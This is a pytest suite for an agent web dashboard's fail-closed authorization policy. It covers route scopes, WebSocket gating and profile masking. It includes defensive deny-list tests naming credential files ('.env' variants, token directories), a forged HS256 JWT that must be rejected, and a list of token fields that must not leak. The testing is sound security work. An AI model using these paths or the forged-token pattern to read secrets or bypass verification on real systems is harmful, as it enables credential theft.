"""Authorization refuses what it does not recognise, on both surfaces.

Before this, :func:`authz.authorize` returned ``True`` for any route no table
described. That meant adding an endpoint published it, and that forgetting to
classify one was indistinguishable from deciding it was open — with an
interactive shell, arbitrary file write and the endpoint that rewrites the
agent's system prompt among the routes nobody had classified.

Three things are held here:

* every route the real router builds resolves to a decision, and an invented
  one resolves to a refusal;
* the flip did not take the product away — the capabilities an ordinary
  signed-in user already had still resolve to scopes that user holds;
* every WebSocket enforces a scope at the upgrade, because Starlette's HTTP
  middleware never runs on one and the flip does not reach them.
"""

from __future__ import annotations

import inspect
import json
import sys
from unittest import mock
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[2]
if str(REPO) not in sys.path:
    sys.path.insert(0, str(REPO))

from scripts.youtab.route_inventory import collect  # noqa: E402
from youtab_agent_cli import authz  # noqa: E402
from youtab_agent_cli.authz import (  # noqa: E402
    AUTHENTICATED,
    PUBLIC,
    Principal,
    ROLE_SCOPES,
    Role,
    authorize,
    required_scope,
    resolve_principal,
)


@pytest.fixture(scope="module")
def app():
    from youtab_agent_cli.web_server import app as application

    return application


@pytest.fixture(scope="module")
def inventory(app):
    return collect(app)


def probe(path: str) -> str:
    """A concrete request path for a normalised template."""
    return "/" if path == "/" else path.replace("{}", "x")


# --- the flip ---------------------------------------------------------------


class TestUnknownRoutesAreRefused:
    def test_an_unclassified_api_route_resolves_to_nothing(self):
        assert required_scope("/api/not-a-real-endpoint", "GET") is None
        assert required_scope("/api/not-a-real-endpoint", "POST") is None

    def test_and_is_therefore_refused_for_everyone(self):
        """Including the Owner. An unmapped route is refused, not escalated."""
        owner = Principal(user_id="o", org_id="", role=Role.YOUTAB_OWNER,
                          scopes=ROLE_SCOPES[Role.YOUTAB_OWNER])
        assert not authorize(owner, "/api/not-a-real-endpoint", "GET")
        assert not authorize(owner, "/api/not-a-real-endpoint", "DELETE")

    def test_an_unauthenticated_caller_holds_nothing(self):
        anonymous = Principal(user_id="", org_id="")
        assert not authorize(anonymous, "/api/sessions", "GET")
        assert not authorize(anonymous, "/api/env", "GET")

    def test_authenticated_class_needs_a_session_and_nothing_more(self):
        assert required_scope("/api/auth/me", "GET") == AUTHENTICATED
        assert not authorize(Principal(user_id="", org_id=""), "/api/auth/me", "GET")
        assert authorize(Principal(user_id="u", org_id=""), "/api/auth/me", "GET")


class TestEveryRealRouteResolves:
    def test_no_http_route_is_unclassified(self, inventory):
        """The whole router, not a list somebody maintains by hand."""
        unmapped = [
            f"{m} {p}" for p, m in (tuple(x) for x in inventory["http"])
            if required_scope(probe(p), m) is None
        ]
        assert unmapped == []

    def test_the_surface_is_the_size_it_should_be(self, inventory):
        """A collector that found nothing would satisfy the check above."""
        assert inventory["counts"]["http_route_methods"] > 250
        assert inventory["counts"]["websocket"] == 7


class TestTheSpaCatchAllCannotReopenTheSurface:
    """The one rule that could quietly undo the flip.

    ``GET /{full_path:path}`` matches everything no other route claimed. As a
    plain pattern it would also match a new ``/api`` endpoint nobody had
    classified, and the entire surface would be public again.
    """

    def test_a_client_side_route_is_public(self):
        assert required_scope("/settings", "GET") == PUBLIC
        assert required_scope("/chat/abc123", "GET") == PUBLIC

    @pytest.mark.parametrize("path", [
        "/api/not-a-real-endpoint",
        "/api/deeply/nested/invention",
        "/auth/not-a-real-flow",
    ])
    def test_but_an_application_root_never_falls_through_to_it(self, path):
        assert required_scope(path, "GET") is None
        assert not authorize(Principal(user_id="u", org_id=""), path, "GET")

    def test_the_root_itself_is_public_in_both_build_states(self):
        """One registry key, two endpoint bodies.

        ``serve_spa`` when the frontend is built, ``no_frontend`` when it is
        not. Public is right for both: the built form returns the login shell,
        the unbuilt form returns a 404 JSON. A runner that skipped the
        frontend build must not go red for the wrong reason.
        """
        assert required_scope("/", "GET") == PUBLIC


# --- the flip did not remove the product ------------------------------------


class TestOrdinaryUsersKeepTheirCapabilities:
    """Fail-closed must not mean fail-empty.

    Every route below was reachable by a signed-in user before the flip,
    because it was unguarded. If the flip left them refused, the change would
    have removed the product rather than secured it.
    """

    @pytest.fixture
    def user(self):
        # Absent from the roster, which is the ordinary case: the roster
        # grants elevation, it is not what makes someone a user.
        return resolve_principal(user_id="someone", org_id="acme", roster={})

    @pytest.mark.parametrize("path,method", [
        ("/api/sessions", "GET"),
        ("/api/sessions/abc", "DELETE"),
        ("/api/profiles", "GET"),
        ("/api/profiles/abc/soul", "GET"),
        ("/api/profiles/abc/soul", "PUT"),
        ("/api/git/status", "GET"),
        ("/api/skills", "GET"),
        ("/api/fs/read", "GET"),
        ("/api/files/list", "GET"),
        ("/api/memory", "GET"),
        ("/api/memory/reset", "POST"),
        ("/api/tools", "GET"),
        ("/api/mcp/servers", "GET"),
        ("/api/cron/jobs", "GET"),
        ("/api/messaging/channels", "GET"),
        ("/api/plugins/kanban/board", "GET"),
        ("/api/plugins/kanban/tasks", "POST"),
        ("/api/dashboard/capabilities", "GET"),
        ("/api/config/defaults", "GET"),
    ])
    def test_a_normal_user_still_reaches_it(self, user, path, method):
        assert authorize(user, path, method), f"{method} {path} was taken away"


class TestPrivilegedSurfaceStaysPrivileged:
    @pytest.fixture
    def user(self):
        return resolve_principal(user_id="someone", org_id="acme", roster={})

    @pytest.mark.parametrize("path,method", [
        ("/api/env", "GET"),
        ("/api/env", "PUT"),
        ("/api/env/reveal", "POST"),
        ("/api/credentials/pool", "GET"),
        ("/api/model/set", "POST"),
        ("/api/model/options", "GET"),
        ("/api/providers/oauth", "GET"),
        ("/api/gateway/stop", "POST"),
        ("/api/ops/anything", "GET"),
        ("/docs", "GET"),
        ("/openapi.json", "GET"),
        # Read from the endpoint body before the cluster rule was applied.
        ("/api/plugins/kanban/model-options", "GET"),
        ("/api/plugins/kanban/profiles", "GET"),
        ("/api/profiles/abc/model", "PUT"),
    ])
    def test_a_normal_user_is_refused(self, user, path, method):
        assert not authorize(user, path, method), f"{method} {path} was opened"

    def test_the_engine_bypass_is_closed(self):
        """Both writes of the same binding are held to the same scope."""
        assert (required_scope("/api/profiles/abc/model", "PUT")
                == required_scope("/api/model/set", "POST")
                == authz.ENGINE_SELECT)

    def test_restricting_the_roster_read_did_not_cost_the_editor(self):
        user = resolve_principal(user_id="someone", org_id="acme", roster={})
        assert authorize(user, "/api/plugins/kanban/profiles/abc", "PATCH")
        assert authorize(
            user, "/api/plugins/kanban/profiles/abc/describe-auto", "POST")


class TestTheLoginFlowStaysReachable:
    """Every one of these has to answer before a session can exist."""

    @pytest.mark.parametrize("path,method", [
        ("/api/auth/providers", "GET"),
        ("/auth/login", "GET"),
        ("/auth/callback", "GET"),
        ("/auth/password-login", "POST"),
        ("/auth/logout", "POST"),
        ("/login", "GET"),
        ("/auth/native/authorize", "GET"),
        ("/auth/native/token", "POST"),
        ("/auth/native/refresh", "POST"),
        ("/api/health", "GET"),
        ("/assets/index-a1b2.css", "GET"),
        ("/dashboard-plugins/kanban/main.js", "GET"),
    ])
    def test_it_is_public(self, path, method):
        assert required_scope(path, method) == PUBLIC
        assert authorize(Principal(user_id="", org_id=""), path, method)

    #: Present only when the frontend has been built. A runner that skipped
    #: the build must not go red for it, and a runner that did the build must
    #: not be allowed to smuggle in an extra public route under cover of it.
    BUILD_CONDITIONAL = {"/assets/{}.css"}

    #: Bypass the *cookie* gate, not authentication. Each carries its own
    #: credential that its handler verifies, and holding them to a session
    #: scope refuses them before that verification ever runs.
    CREDENTIAL_BEARING = {"/api/cron/fire", "/api/mcp/oauth/callback/{}"}

    AUTHORISED_PUBLIC = {
        "/api/auth/providers", "/auth/login",
        "/auth/callback", "/auth/password-login", "/auth/logout",
        "/login", "/auth/native/authorize", "/auth/native/token",
        "/auth/native/refresh", "/api/health", "/{}", "/assets/{}.css",
        "/dashboard-plugins/{}/{}",
        # The probe contract and the SPA's pre-login bootstrap.
        "/api/status", "/api/config/defaults", "/api/config/schema",
        "/api/dashboard/themes", "/api/dashboard/plugins",
    } | CREDENTIAL_BEARING

    def test_nothing_else_became_public(self, inventory):
        """The public set is what was authorised, and never larger.

        Checked as a subset rather than an equality because the built and
        unbuilt routers differ by exactly ``/assets/{}.css``. Equality would
        make this fail on a CI runner that did not build the frontend -- red
        for a reason that has nothing to do with authorization, which is the
        kind of failure that teaches people to ignore the check.
        """
        actual = {
            p for p, m in (tuple(x) for x in inventory["http"])
            if required_scope(probe(p), m) == PUBLIC
        }
        assert actual <= self.AUTHORISED_PUBLIC, (
            f"unauthorised public routes: {sorted(actual - self.AUTHORISED_PUBLIC)}"
        )
        missing = self.AUTHORISED_PUBLIC - actual
        assert missing <= self.BUILD_CONDITIONAL, (
            f"authorised public routes absent from the router: {sorted(missing)}"
        )

    def test_the_build_conditional_route_is_public_when_it_exists(self, inventory):
        """And is genuinely conditional, not silently missing in both states."""
        paths = {p for p, _ in (tuple(x) for x in inventory["http"])}
        for path in self.BUILD_CONDITIONAL:
            if path in paths:
                assert required_scope(probe(path), "GET") == PUBLIC

    def test_the_csrf_mint_is_not_public(self):
        """It reads as login bootstrap; the handler says otherwise.

        `api_auth_csrf` raises 401 when there is no session, and its docstring
        mints "for the authenticated principal". It is also on neither
        middleware allowlist. Public would have described a reachability the
        code does not provide, so it is AUTHENTICATED like the routes beside it.
        """
        assert required_scope("/api/auth/csrf", "GET") == AUTHENTICATED
        assert not authorize(Principal(user_id="", org_id=""), "/api/auth/csrf", "GET")
        assert authorize(Principal(user_id="u", org_id=""), "/api/auth/csrf", "GET")

    def test_status_is_public_again(self):
        """Superseded: the withdrawal broke the portal probe and was reverted.

        Kept as an assertion rather than deleted, so the reversal is recorded
        where the withdrawal was. See TestStatusKeepsItsProbeContract.
        """
        assert required_scope("/api/status", "GET") == PUBLIC


# --- WebSockets -------------------------------------------------------------


class TestEveryWebSocketEnforcesAScope:
    """HTTP middleware never runs on an upgrade, so the flip does not reach here.

    Asserted against the handler source rather than by driving seven sockets:
    what has to be true is that each one calls the scope gate before it
    accepts, and that is a property of the handler, not of one connection.
    """

    SOCKETS = {
        "/api/pty": "PTY_SCOPE",
        "/api/console": "CONSOLE_SCOPE",
        "/api/ws": "WS_SCOPE",
        "/api/pub": "EVENTS_READ",
        "/api/audio/speak-stream": "AUDIO_STREAM_SCOPE",
        "/api/events": "EVENTS_READ",
    }

    def _handler_source(self, app, path):
        for route in app.routes:
            if getattr(route, "path", None) == path and not getattr(
                route, "methods", None
            ):
                return inspect.getsource(inspect.unwrap(route.endpoint))
        raise AssertionError(f"no WebSocket route at {path}")

    @pytest.mark.parametrize("path", sorted(SOCKETS))
    def test_it_calls_the_scope_gate(self, app, path):
        source = self._handler_source(app, path)
        assert "_ws_scope_ok" in source, f"{path} accepts without a scope check"
        if "ws.accept()" in source:
            assert source.index("_ws_scope_ok") < source.index("ws.accept()"), (
                f"{path} checks the scope after accepting the upgrade"
            )
        else:
            # Hands the socket to a delegate (tui_gateway) that accepts it, so
            # the gate only has to precede the handoff.
            assert source.index("_ws_scope_ok") < source.index("handle_ws(ws)")

    @pytest.mark.parametrize("path,const", sorted(SOCKETS.items()))
    def test_it_enforces_the_scope_named_for_it(self, app, path, const):
        assert const in self._handler_source(app, path)

    def test_the_plugin_socket_enforces_through_its_own_gate(self):
        """It delegates, so the check lives in the helper it delegates to."""
        from plugins.kanban.dashboard import plugin_api

        source = inspect.getsource(plugin_api._ws_upgrade_authorized)
        assert "_ws_scope_ok" in source
        assert "PLUGIN_USE" in source

    def test_the_shell_socket_is_not_held_to_a_read_scope(self):
        """An interactive shell is a write, whatever else it is."""
        assert authz.PTY_SCOPE == authz.SESSION_WRITE
        reader = Principal(user_id="r", org_id="",
                           scopes=frozenset({authz.SESSION_READ}))
        assert not reader.has(authz.PTY_SCOPE)


# --- the findings this slice was opened to resolve ---------------------------


class TestStatusKeepsItsProbeContract:
    """Restored after being withdrawn. The withdrawal broke a real consumer.

    NAS ``fly-provider.ts getInstanceRuntimeStatus`` fetches ``/api/status``
    without a cookie as its sole signal that a wildcard-subdomain agent is
    alive. Holding it to ``ui:read`` returned 403 and surfaced every healthy
    agent as STARTING/down. It is public again, and the reason it is safe to
    be public is a property of its *payload*, which the next test pins.
    """

    def test_it_is_public(self):
        assert required_scope("/api/status", "GET") == PUBLIC
        assert authorize(Principal(user_id="", org_id=""), "/api/status", "GET")

    def test_it_is_not_shadowed_by_the_cluster_grant(self):
        """An exact entry has to beat the prefix, or the fix is cosmetic."""
        from youtab_agent_cli.authz import UI_READ

        assert required_scope("/api/status", "GET") != UI_READ

    def test_the_allowlist_and_the_policy_now_agree(self):
        """They disagreed while /api/status was withdrawn. That is resolved."""
        from youtab_agent_cli.dashboard_auth.public_paths import PUBLIC_API_PATHS

        for path in PUBLIC_API_PATHS:
            assert required_scope(path, "GET") in (PUBLIC, None) or path == "/api/cron/fire", (
                f"{path} is on the middleware allowlist but the policy guards it"
            )
        assert "/api/status" in PUBLIC_API_PATHS


class TestProfileListMasksThePrivateFields:
    """The disclosure was in the payload, so the fix is in the payload.

    Holding ``GET /api/profiles`` at ``provider:read`` would have closed it by
    removing the profile picker from every ordinary user. The route stays a
    user capability; four of its fields do not.
    """

    @pytest.fixture
    def records(self):
        return [{
            "name": "default", "description": "d", "skill_count": 3,
            "model": "gpt-x", "provider": "acme",
            "path": "/root/.youtab-agent-runtime", "has_env": True,
        }]

    def test_a_normal_user_sees_none_of_them(self, records):
        from youtab_agent_cli.web_server import (
            PRIVATE_PROFILE_FIELDS, mask_private_profile_fields,
        )

        user = resolve_principal(user_id="someone", org_id="acme", roster={})
        [masked] = mask_private_profile_fields(records, user)
        for field in PRIVATE_PROFILE_FIELDS:
            assert field not in masked, f"{field} still disclosed to a normal user"
        assert masked["restricted"] is True

    def test_the_useful_fields_survive(self, records):
        """Masking that removed the picker's own data would be a regression."""
        from youtab_agent_cli.web_server import mask_private_profile_fields

        user = resolve_principal(user_id="someone", org_id="acme", roster={})
        [masked] = mask_private_profile_fields(records, user)
        assert masked["name"] == "default"
        assert masked["description"] == "d"
        assert masked["skill_count"] == 3

    def test_a_provider_reader_still_sees_them(self, records):
        from youtab_agent_cli.web_server import mask_private_profile_fields

        owner = Principal(user_id="o", org_id="", role=Role.YOUTAB_OWNER,
                          scopes=ROLE_SCOPES[Role.YOUTAB_OWNER])
        [full] = mask_private_profile_fields(records, owner)
        assert full["provider"] == "acme"
        assert full["model"] == "gpt-x"

    def test_an_absent_principal_is_masked_not_trusted(self, records):
        from youtab_agent_cli.web_server import mask_private_profile_fields

        assert "provider" not in mask_private_profile_fields(records, None)[0]

    def test_the_route_itself_stays_a_user_capability(self):
        user = resolve_principal(user_id="someone", org_id="acme", roster={})
        assert authorize(user, "/api/profiles", "GET")


class TestCredentialBearingRoutesVerifyTheirCredential:
    """Public at the gate is only correct if the handler is the real boundary.

    Both were read rather than assumed.
    """

    def test_the_cron_fire_verifier_refuses_without_a_key(self):
        """No JWKS configured must mean refuse, never unsigned decode."""
        from plugins.cron_providers.chronos.verify import verify_nas_fire_token

        assert verify_nas_fire_token(
            token="x.y.z", expected_audience="agent:1", jwks_or_key=None) is None

    def test_the_cron_fire_verifier_refuses_without_an_audience(self):
        from plugins.cron_providers.chronos.verify import verify_nas_fire_token

        assert verify_nas_fire_token(
            token="x.y.z", expected_audience="", jwks_or_key="https://n/jwks") is None

    def test_the_cron_fire_verifier_refuses_an_empty_token(self):
        from plugins.cron_providers.chronos.verify import verify_nas_fire_token

        assert verify_nas_fire_token(
            token="", expected_audience="agent:1", jwks_or_key="https://n/jwks") is None

    def test_the_cron_fire_verifier_rejects_symmetric_algorithms(self):
        """NAS signs asymmetrically; an HS256 token must not verify."""
        import jwt as pyjwt
        from plugins.cron_providers.chronos.verify import verify_nas_fire_token

        forged = pyjwt.encode(
            {"aud": "agent:1", "exp": 9999999999, "purpose": "cron_fire"},
            "secret", algorithm="HS256")
        assert verify_nas_fire_token(
            token=forged, expected_audience="agent:1", jwks_or_key="secret") is None

    def test_the_mcp_callback_compares_state_in_constant_time(self):
        """The OAuth state is the boundary, so how it is compared matters."""
        import inspect

        from youtab_agent_cli.web_routers import mcp

        source = inspect.getsource(mcp.mcp_oauth_callback)
        assert "compare_digest" in source
        assert "expected_state" in source

    def test_both_are_public_at_the_gate(self):
        assert required_scope("/api/cron/fire", "POST") == PUBLIC
        assert required_scope("/api/mcp/oauth/callback/notion", "GET") == PUBLIC

    def test_the_rest_of_their_clusters_is_not(self):
        """The exemption is the one route, not the prefix around it."""
        from youtab_agent_cli.authz import AUTOMATION_MANAGE, TOOL_MANAGE

        assert required_scope("/api/cron/jobs", "GET") == AUTOMATION_MANAGE
        assert required_scope("/api/mcp/servers", "GET") == TOOL_MANAGE


class TestPathRoutesAreMatchedAsPaths:
    """Two rules were written as fixed-segment patterns against ``:path`` routes.

    Every real request carried more segments than the pattern allowed, fell
    through to a refusal, and 403'd a route that was meant to be reachable.
    Caught only because the full suite was run rather than the selected files.
    """

    @pytest.mark.parametrize("path", [
        "/dashboard-plugins/bundledx/dist/index.js",
        "/dashboard-plugins/kanban/assets/deep/nested/main.css",
    ])
    def test_a_multi_segment_plugin_asset_resolves(self, path):
        assert required_scope(path, "GET") == PUBLIC

    @pytest.mark.parametrize("path", [
        "/api/mcp/oauth/callback/notion",
        "/api/mcp/oauth/callback/scoped/server/name",
    ])
    def test_a_multi_segment_callback_resolves(self, path):
        assert required_scope(path, "GET") == PUBLIC


class TestApiDocsProductionPolicy:
    """Decision: operator-only, not public, not removed.

    Removing them outright would need the routes never registered, which is an
    app-construction change rather than a policy one. Holding them at
    ``ops:manage`` gives the same externally-visible result -- an anonymous or
    ordinary caller cannot read the API surface -- and keeps the route
    inventory stable so the policy stays checkable.
    """

    PATHS = ["/docs", "/redoc", "/openapi.json", "/docs/oauth2-redirect"]

    @pytest.mark.parametrize("path", PATHS)
    def test_an_anonymous_caller_is_refused(self, path):
        assert not authorize(Principal(user_id="", org_id=""), path, "GET")

    @pytest.mark.parametrize("path", PATHS)
    def test_a_normal_user_is_refused(self, path):
        user = resolve_principal(user_id="someone", org_id="acme", roster={})
        assert not authorize(user, path, "GET")

    @pytest.mark.parametrize("path", PATHS)
    def test_an_operator_holding_ops_manage_is_allowed(self, path):
        from youtab_agent_cli.authz import OPS_MANAGE

        operator = Principal(user_id="op", org_id="",
                             role=Role.YOUTAB_OPERATOR,
                             scopes=frozenset({OPS_MANAGE}))
        assert authorize(operator, path, "GET")

    def test_ops_manage_is_not_in_the_user_baseline(self):
        from youtab_agent_cli.authz import OPS_MANAGE, USER_CAPABILITIES

        assert OPS_MANAGE not in USER_CAPABILITIES


class TestTheUserBaselineWasValidatedRouteByRoute:
    """Three routes the cluster rule handed to every signed-in user wrongly.

    Each was found by reading the endpoint body rather than by looking at the
    prefix, which is the only way this class of error surfaces: all three sit
    in clusters whose other routes are genuinely user capability.
    """

    @pytest.fixture
    def user(self):
        return resolve_principal(user_id="someone", org_id="acme", roster={})

    def test_model_analytics_is_not_a_user_capability(self, user):
        """It selects `model, billing_provider` per session."""
        assert required_scope("/api/analytics/models", "GET") == authz.PROVIDER_READ
        assert not authorize(user, "/api/analytics/models", "GET")

    def test_but_the_caller_keeps_their_own_usage_totals(self, user):
        """Restricting the disclosure must not cost the neighbouring feature."""
        assert authorize(user, "/api/analytics/usage", "GET")

    def test_portal_status_is_not_a_user_capability(self, user):
        """It reports each feature's `current_provider` -- the binding."""
        assert required_scope("/api/portal", "GET") == authz.PROVIDER_READ
        assert not authorize(user, "/api/portal", "GET")

    def test_the_ssh_owner_nonce_is_not_a_user_capability(self, user):
        """It returns a live secret; its own docstring calls it sensitive."""
        assert required_scope("/api/ssh/ownership", "GET") == authz.OPS_MANAGE
        assert not authorize(user, "/api/ssh/ownership", "GET")

    def test_no_ops_route_reaches_the_user_baseline(self, inventory, user):
        """The whole /api/ops cluster, checked against the router not a list."""
        for pair in inventory["http"]:
            path, method = tuple(pair)
            if not path.startswith("/api/ops"):
                continue
            assert not authorize(user, probe(path), method), (
                f"{method} {path} is reachable by an ordinary user"
            )

    def test_no_baseline_scope_is_a_privileged_scope(self):
        """The grant is a set; this is the assertion that it stayed clean."""
        from youtab_agent_cli.authz import USER_CAPABILITIES

        privileged = {
            authz.PROVIDER_READ, authz.PROVIDER_WRITE, authz.CREDENTIAL_READ,
            authz.CREDENTIAL_WRITE, authz.ENGINE_SELECT, authz.TENANT_MANAGE_ANY,
            authz.DEPLOYMENT_MANAGE, authz.EVENTS_READ, authz.OPS_MANAGE,
        }
        assert not (USER_CAPABILITIES & privileged)


class TestTheFsClusterCannotReachCredentialMaterial:
    """`fs:read` was a way to read the credential store without `credential:read`.

    `/api/fs/*` resolves any absolute path on the host — unlike `/api/files/*`,
    which is bounded by an operator-chosen root and already filters sensitive
    paths. Since `fs:read` and `fs:write` are both in the normal-user baseline,
    every signed-in user could read `.env` and the canonical credential
    basenames, which is exactly what `credential:read` exists to gate.

    The same shape as the per-profile model write that bypassed
    `engine:select`: a scope is not a control while another route reaches the
    same data.
    """

    @pytest.fixture
    def sensitive(self, tmp_path):
        target = tmp_path / ".env"
        target.write_text("YOUTAB_API_KEY=super-secret\n", encoding="utf-8")
        return target

    def test_reading_a_credential_file_is_refused(self, sensitive):
        from fastapi import HTTPException

        from youtab_agent_cli.web_server import _fs_path_or_refuse

        with pytest.raises(HTTPException) as excinfo:
            _fs_path_or_refuse(str(sensitive))
        assert excinfo.value.status_code == 403

    @pytest.mark.parametrize("name", [
        ".env", ".env.local", ".ENV", ".envrc",
    ])
    def test_the_env_variants_are_all_covered(self, tmp_path, name):
        from fastapi import HTTPException

        from youtab_agent_cli.web_server import _fs_path_or_refuse

        (tmp_path / name).write_text("K=v\n", encoding="utf-8")
        with pytest.raises(HTTPException):
            _fs_path_or_refuse(str(tmp_path / name))

    def test_the_credential_directory_trees_are_covered(self, tmp_path):
        from fastapi import HTTPException

        from youtab_agent_cli.web_server import _fs_path_or_refuse

        for tree in ("mcp-tokens", "pairing"):
            path = tmp_path / tree / "token.json"
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text("{}", encoding="utf-8")
            with pytest.raises(HTTPException):
                _fs_path_or_refuse(str(path))

    def test_writing_one_is_refused_too(self, sensitive):
        """An unguarded write could plant a .env the runtime later loads."""
        from fastapi import HTTPException

        from youtab_agent_cli.web_server import _fs_path_or_refuse

        with pytest.raises(HTTPException):
            _fs_path_or_refuse(str(sensitive))

    def test_an_ordinary_project_file_is_untouched(self, tmp_path):
        """The fix closes a credential bypass, it does not narrow the workspace."""
        from youtab_agent_cli.web_server import _fs_path_or_refuse

        ordinary = tmp_path / "main.py"
        ordinary.write_text("print('hi')\n", encoding="utf-8")
        assert _fs_path_or_refuse(str(ordinary)) == ordinary.resolve()

    def test_listing_omits_credential_entries(self, tmp_path):
        """Listing must not disclose that a credential file exists."""
        import asyncio

        from youtab_agent_cli.web_server import fs_list

        (tmp_path / ".env").write_text("K=v\n", encoding="utf-8")
        (tmp_path / "main.py").write_text("x\n", encoding="utf-8")
        names = {e["name"] for e in asyncio.run(fs_list(str(tmp_path)))["entries"]}
        assert "main.py" in names
        assert ".env" not in names

    def test_the_fs_scopes_are_still_ordinary_user_capability(self):
        """The guard is on the data, not on the caller. Capability is kept."""
        user = resolve_principal(user_id="someone", org_id="acme", roster={})
        assert authorize(user, "/api/fs/read-text", "GET")
        assert authorize(user, "/api/fs/write-text", "POST")


class TestTheToolsetGroupIsNotUserCapability:
    """Four routes at `tool:manage` that write credentials and read catalogues.

    Found by sweeping every endpoint the normal-user baseline reaches for
    bodies touching provider bindings, credentials or engine identifiers, then
    opening the ones that matched. All four sit inside `/api/tools`, whose
    other routes are genuine user capability.
    """

    @pytest.fixture
    def user(self):
        return resolve_principal(user_id="someone", org_id="acme", roster={})

    def test_writing_toolset_api_keys_needs_credential_write(self, user):
        """It writes into the same .env that PUT /api/env is gated on."""
        scope = required_scope("/api/tools/toolsets/web/env", "PUT")
        assert scope == authz.CREDENTIAL_WRITE
        assert scope == required_scope("/api/env", "PUT")
        assert not authorize(user, "/api/tools/toolsets/web/env", "PUT")

    def test_reading_the_key_status_matrix_needs_credential_read(self, user):
        """`is_set` per env var is credential-slot metadata by definition."""
        assert required_scope("/api/tools/toolsets/web/config", "GET") == \
            authz.CREDENTIAL_READ
        assert not authorize(user, "/api/tools/toolsets/web/config", "GET")

    def test_reading_a_backend_model_catalogue_needs_provider_read(self, user):
        assert required_scope("/api/tools/toolsets/web/models", "GET") == \
            authz.PROVIDER_READ
        assert not authorize(user, "/api/tools/toolsets/web/models", "GET")

    def test_selecting_a_backend_model_needs_engine_select(self, user):
        """The third route found writing an engine binding off-scope."""
        scope = required_scope("/api/tools/toolsets/web/model", "PUT")
        assert scope == authz.ENGINE_SELECT
        assert scope == required_scope("/api/model/set", "POST")
        assert not authorize(user, "/api/tools/toolsets/web/model", "PUT")

    def test_the_rest_of_the_tools_cluster_stays_user_capability(self, user):
        """Restricting four routes must not cost the toolset feature."""
        assert authorize(user, "/api/tools", "GET")
        assert authorize(user, "/api/tools/toolsets", "GET")

    def test_every_engine_binding_write_is_held_to_one_scope(self):
        """All three known writers of a model binding, in one assertion.

        Each was found separately and each would have been a bypass on its own;
        pinning them together is what stops a fourth being added beside them.
        """
        for path, method in (
            ("/api/model/set", "POST"),
            ("/api/profiles/abc/model", "PUT"),
            ("/api/tools/toolsets/web/model", "PUT"),
        ):
            assert required_scope(path, method) == authz.ENGINE_SELECT, f"{method} {path}"


class TestMemoryProviderConfigStaysUserCapabilityBecauseItMasks:
    """Why this is not the toolset config, which was restricted.

    Both surfaces report `is_set` per credential field. They are not the same
    thing. The toolset config also returns Youtab's private provider matrix —
    the catalogue `/api/model/options` is held at `provider:read` for — so it
    moved. Memory providers are plugins the user installs, holding the user's
    own keys, and configuring them is a capability the memory feature is made
    of. What makes it safe to leave is that no secret value is ever returned,
    which is a property of the code and is therefore asserted here.
    """

    def test_neither_payload_builder_returns_a_secret_value(self):
        import inspect

        from youtab_agent_cli import web_server

        for name in ("_public_memory_provider_field", "_declared_provider_payload"):
            source = inspect.getsource(getattr(web_server, name))
            assert 'value' in source and ('""' in source or "''" in source), name
            assert "secret" in source, f"{name} does not distinguish secret fields"

    def test_a_secret_field_is_blanked_not_returned(self):
        from youtab_agent_cli.web_server import _public_memory_provider_field

        field = {
            "key": "api_key", "kind": "secret", "label": "API key",
            "description": "", "placeholder": "", "required": True,
            "options": [],
        }
        entry = _public_memory_provider_field(field, {"api_key": "sk-live-REAL"})
        assert entry["value"] == ""
        assert "sk-live-REAL" not in repr(entry)
        assert entry["is_set"] is True

    def test_configuring_memory_stays_reachable(self):
        user = resolve_principal(user_id="someone", org_id="acme", roster={})
        assert authorize(user, "/api/memory/providers/mem0/config", "GET")
        assert authorize(user, "/api/memory/providers/mem0/config", "PUT")
        assert authorize(user, "/api/memory", "GET")


class TestRoutesTheSweepFlaggedAndTheBodyCleared:
    """Flagged by the privileged-data sweep, kept after reading them.

    Recorded because "we looked and it was fine" is only worth something if the
    property that made it fine is asserted. Each of these stays user capability
    *because* of a specific line, and these tests are those lines.
    """

    @pytest.fixture
    def user(self):
        return resolve_principal(user_id="someone", org_id="acme", roster={})

    def test_the_mcp_flow_snapshot_carries_no_credential(self):
        """`GET /api/mcp/oauth/flows/{id}` returns the flow's snapshot."""
        import inspect

        from tools.mcp_dashboard_oauth import DashboardOAuthFlow

        source = inspect.getsource(DashboardOAuthFlow.snapshot)
        for leaked in ("access_token", "refresh_token", "client_secret",
                       "expected_state", "code"):
            assert leaked not in source, f"snapshot() exposes {leaked}"
        assert "status" in source and "flow_id" in source

    def test_messaging_platform_tokens_are_redacted_on_read(self):
        """`GET /api/messaging/platforms` reports set-ness, not the token."""
        import inspect

        from youtab_agent_cli import web_server

        source = inspect.getsource(web_server._messaging_platform_payload)
        assert "redacted_value" in source
        assert "redact_key(value)" in source
        assert '"is_set": bool(value)' in source

    def test_messaging_stays_a_user_capability(self, user):
        """The user's own bot tokens, redacted on read. Not Youtab's bindings."""
        assert authorize(user, "/api/messaging/platforms", "GET")
        assert authorize(user, "/api/messaging/platforms/telegram", "PUT")

    def test_the_git_cluster_stays_workspace_capability(self, user):
        """Reads and writes split as the cluster rule assigned; bodies agree."""
        for path, method, scope in (
            ("/api/git/status", "GET", authz.REPO_READ),
            ("/api/git/review/diff", "GET", authz.REPO_READ),
            ("/api/git/review/commit", "POST", authz.REPO_WRITE),
            ("/api/git/worktree/add", "POST", authz.REPO_WRITE),
        ):
            assert required_scope(path, method) == scope, f"{method} {path}"
            assert authorize(user, path, method)


class TestPairingCannotAuthorizeAnotherIdentity:
    """A normal user pairs their own account and authorizes nobody else's.

    `POST /api/pairing/approve` carried two authorization semantics behind one
    path, both at `device:manage`, and `device:manage` was in the normal-user
    baseline. So any signed-in user could approve a *stranger's* pending
    request and admit that stranger to the agent.

    The two branches are not the same act:

    * the **code** is DM'd to whoever asked to pair and is never returned by
      any endpoint (`list_pending` hashes it), so possession is proof of
      identity — self-service;
    * the **request id** is handed to anyone who can read `GET /api/pairing`
      and proves nothing about the caller — administration of someone else's
      access.
    """

    @pytest.fixture
    def user(self):
        return resolve_principal(user_id="someone", org_id="acme", roster={})

    @pytest.fixture
    def tenant_admin(self):
        return Principal(user_id="ta", org_id="acme", role=Role.TENANT_ADMIN,
                         scopes=ROLE_SCOPES[Role.TENANT_ADMIN])

    def test_a_normal_user_may_redeem_a_code(self, user):
        """Self-pairing is preserved. This is the capability half."""
        assert required_scope("/api/pairing/approve", "POST") == authz.DEVICE_PAIR_SELF
        assert authorize(user, "/api/pairing/approve", "POST")

    def test_a_normal_user_cannot_list_who_is_paired(self, user):
        assert not authorize(user, "/api/pairing", "GET")

